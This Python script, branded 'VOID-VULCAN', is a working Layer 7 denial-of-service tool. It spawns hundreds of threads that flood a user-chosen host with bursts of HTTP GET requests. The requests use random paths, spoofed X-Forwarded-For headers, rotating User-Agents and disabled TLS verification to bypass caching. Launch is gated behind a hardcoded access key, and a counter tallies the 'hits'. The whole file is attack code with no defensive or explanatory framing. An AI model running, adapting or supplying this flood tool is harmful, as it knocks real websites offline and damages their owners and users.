import socket
import os
import sys
import time
import threading
import random
import string
import ssl

# --- UI VOID TEAM ---
def get_logo():
    return r"""
 ░▒▓██████▓▒░      ▄▄██████▄▄      ░▒▓██████▓▒░
 ░▒▓██▓▒░        ▄████████████▄        ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▀▄ ▓▓ ▄▀ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▓▓ ▼▼ ▓▓ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░        ▀████████████▀        ░▒▓██▓▒░
  ░▒▓██▓▒░         ▀▀██████▀▀         ░▒▓██▓▒░
 
        ╔══════════════════════════════════╗
        ║      V O I D - V U L C A N       ║
        ╚══════════════════════════════════╝
           [ MODE: RAPID BYPASS / LAYER 7 ]
    """

total_hits = 0

def attack_engine(target, port, ssl_on):
    global total_hits
    try:
        ip = socket.gethostbyname(target)
    except: return

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            s.connect((ip, port))

            # --- TEKNIK VULCAN: BURST MODE ---
            # Kita kirim banyak request valid secepat mungkin
            for _ in range(30):
                rnd_path = ''.join(random.choices(string.ascii_lowercase, k=8))
                # Menggunakan Header untuk bypass cache lebih agresif
                header = (
                    f"GET /{rnd_path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(100,120)}.0.0.0\r\n"
                    f"Accept: */*\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(header.encode())
                total_hits += 1
            s.close()
        except:
            pass

def run_ddos(key):
    if key != "VOID_ACCESS_GRANTED_2026": return
    os.system('clear')
    print(get_logo())
    
    target = input("\n [?] Target (Host Only): ").strip()
    port = int(input(" [?] Port (443/80): ") or 443)
    ssl_on = True if port == 443 else False
    threads = int(input(" [?] Threads: ") or 200)

    print(f"\n [!] LAUNCHING VULCAN TO {target}...")
    for i in range(threads):
        threading.Thread(target=attack_engine, args=(target, port, ssl_on), daemon=True).start()

    while True:
        try:
            sys.stdout.write(f"\r [★] Total Hits: {total_hits} | Status: BURNING...")
            sys.stdout.flush()
            time.sleep(0.5)
        except KeyboardInterrupt: break
